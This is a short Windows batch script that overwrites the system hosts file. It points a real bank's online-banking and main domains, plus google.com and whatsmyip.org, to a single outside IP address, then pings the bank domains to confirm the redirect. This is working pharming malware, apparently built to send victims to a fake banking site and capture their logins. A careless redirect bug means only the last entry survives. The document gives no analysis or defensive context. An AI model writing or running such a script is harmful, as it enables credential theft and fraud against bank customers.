@echo off
echo 23.12.12.34 www.webbanking.comerica.com > %temp%\temphosts.txt
echo 23.12.12.34 www.comerica.com > %temp%\temphosts.txt
echo 23.12.12.34 www.google.com > %temp%\temphosts.txt
echo 23.12.12.34 www.whatsmyip.org > %temp%\temphosts.txt

type C:\WINDOWS\system32\drivers\etc\hosts >> %temp%\temphosts.txt
copy /Y %temp%\temphosts.txt C:\WINDOWS\system32\drivers\etc\hosts
echo C:\WINDOWS\system32\drivers\etc\hosts

ping www.webbanking.comerica.com
ping www.comerica.com
